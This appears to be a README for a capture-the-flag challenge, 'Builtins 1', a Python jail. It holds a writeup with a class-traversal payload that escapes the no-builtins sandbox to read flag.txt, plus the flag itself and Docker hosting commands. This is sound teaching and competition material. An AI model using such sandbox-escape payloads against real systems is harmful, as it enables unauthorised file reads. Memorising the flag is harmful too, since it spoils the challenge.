# Builtins 1
Level - Medium

Description:
```markdown
The Docker container running the jail uses `python:3.12.0a6-bullseye`.

*Per usual, the flag is stored in `./flag.txt`*

nc byuctf.xyz 40002

[b1.py]
```

## Writeup
The following payload should work - `().__class__.__bases__[0].__subclasses__()[124].get_data('.','flag.txt')`. This relies upon Python class traversal, a well-documented technique in bypassing jails.

**Flag** - `byuctf{no_builtins?_no_problem}`

## Hosting
This challenge should be a Docker container that runs the Python script `b1.py` every time someone connects on port 40002. All the proper files are included in here. The command to build the docker container is (when located inside of this directory):

```bash
sudo docker build -t b1 .
sudo docker network create -d bridge b1
```

The command to start the challenge is:

```bash
sudo docker run -p 40002:40000 --detach --name b1 --network b1 b1:latest
```

The command to stop the challenge (since CTRL+C won't work) is:

```bash
sudo docker stop b1
```